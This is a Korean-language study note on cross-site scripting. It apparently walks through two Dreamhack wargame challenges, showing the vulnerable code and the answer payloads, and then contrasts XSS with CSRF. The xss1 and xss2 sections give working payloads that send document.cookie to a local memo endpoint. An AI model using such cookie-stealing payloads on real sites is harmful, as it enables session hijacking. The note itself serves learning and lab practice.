## 목차
* [XSS](#xss)
* [Dreamhack 문제 분석](#dreamhack-문제-분석)
* [CSRF와의 차이](#csrf와의-차이)

## XSS
* Cross-Site Scripting의 약자
    - 직역하면 **사이트 간 스크립팅**
* 웹서비스에 스크립트를 실행할 수 있는 코드를 삽입해 다른 사용자가 공격자가 의도한 스크립트를 실행하게 하는 공격 기법
* 주로 공격자가 피해자에게 악성 스크립트가 포함된 URL을 전달하고, 피해자가 그 URL에 접속하는 방식으로 공격이 진행됨
* Site(protocol + domain + port) 전체를 "출처"로 생각하면 이해하기 편함
    - 접속하고자 했던 site와 공격자가 작성한 스크립트는 출처가 다름
    - 이러한 특성으로 인해 Cross-site (site 간) Scripting 이라는 이름이 붙음!

## Dreamhack 문제 분석
* xss1
    - 해당 문제는 서버의 아래 코드에서 문제가 발생한다.
        ```py
        @app.route("/vuln")
        def vuln():
            param = request.args.get("param", "")
            return param
        ```
    - 해당 코드는 Request의 파라미터로 들어온 값을 그대로 return한다.
        - 이 과정에서 HTML 태그가 포함되어있다면 그대로 렌더링된다.
        - 즉, 해당 Route에서 script 태그를 활용한 Reflected XSS가 가능하다.
    - 정답 페이로드: `<script>window.location.href="http://127.0.0.1:8000/memo?memo="+document.cookie;</script>`
* xss2
    - 해당 문제는 vuln.html의 아래 부분에서 문제가 발생한다.
        ```html
        <script>
            var x = new URLSearchParams(location.search);
            document.getElementById('vuln').innerHTML = x.get('param');
        </script>
        ```
    - 해당 스크립트는 Request의 파라미터로 들어온 값을 오브젝트의 innerHTML에 그대로 넣어준다.
        - 이 경우 xss1과 같은 script 태그 기반의 XSS는 활용이 불가능하다.
            - 리렌더링시 처음 문서를 파싱할 때 만난 스크립트가 아니므로 다시 실행하지 않기 때문이다.
            - 런타임에 생성된 script태그가 실행되려면 아래의 명시적 삽입 절차를 거쳐야 한다.
                ```js
                const script = document.createElement('script');
                
                script.src = '/* src */';
                // or...
                script.text = '/* code */';
                
                parentNode.appendChild(script);
                ```
        - 이러한 특성으로 인해 xss1과 같이 script 태그를 직접 삽입하는 방식은 작동하지 않는다.
        - 하지만 innerHTML을 직접 수정하기 때문에 DOM XSS 공격이 가능하다.
            - 일례로, img태그 등 외부 리소스가 연결된 오브젝트를 생성하거나 수정하면 브라우저는 즉시 해당 URL로 네트워크 요청을 보낸다.
            - 이 과정에서, 이미지 요청 실패시 실행되는 이벤트인 `onerror`를 이용해 임의의 스크립트를 실행하는 것이 가능하다.
    - 정답 페이로드: `<img src="invalid" onerror="window.location.href='http://127.0.0.1:8000/memo?memo='+document.cookie;" />`

## CSRF와의 차이
* CSRF
    - Cross-Site Request Forgery의 약자
        - 직역하면 **사이트간 요청 위조**
    - 사용자의 세션 쿠키 등 인증 정보를 이용하여 공격자가 의도한 서비스 요청을 처리하는 공격 기법
    - 피해자가 특정 웹서비스 A에 로그인한 상태로 공격자의 웹서비스에 접근하면, A에 대한 피해자의 인증 정보를 이용해 A에 요청을 보내는 기법임.

* XSS vs CSRF
    - 두 기법 모두 피해자가 공격자가 의도한 페이지에 접근하게 유도한다는 공통점이 있음.
    - 이 떄 XSS는 취약한 페이지에 직접 접근하게 하는 반면, CSRF는 공격자의 서비스에 접근해 공격자의 서버에서 취약한 서버로 요청을 보냄
